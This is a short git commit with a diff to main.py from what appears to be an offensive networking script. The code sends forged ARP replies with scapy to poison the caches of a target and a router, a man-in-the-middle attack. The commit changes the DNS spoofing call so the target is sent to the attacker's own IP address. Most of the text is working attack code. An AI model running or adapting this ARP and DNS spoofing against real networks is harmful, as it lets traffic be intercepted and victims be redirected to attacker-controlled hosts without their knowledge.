b863fb919046a6cae9aa311b40ae9d32993768cb
Wiibleyde <nathan@bonnell.fr>
2022-11-11 17:57:54 +0100

    dns

--- main.py
+++ main.py
@@ -62,7 +62,7 @@ def main():
     while True:
         scapy.send(scapy.ARP(op=2, pdst=cible[1], hwdst=cible[0], psrc=routeur[1], hwsrc=myMac), verbose=0)
         scapy.send(scapy.ARP(op=2, pdst=routeur[1], hwdst=routeur[0], psrc=cible[1], hwsrc=myMac), verbose=0)
-        dnsSpoofing(cible[1], "www.qwant.com")
+        dnsSpoofing(cible[1], myIp)
         
 
 if __name__ == '__main__':
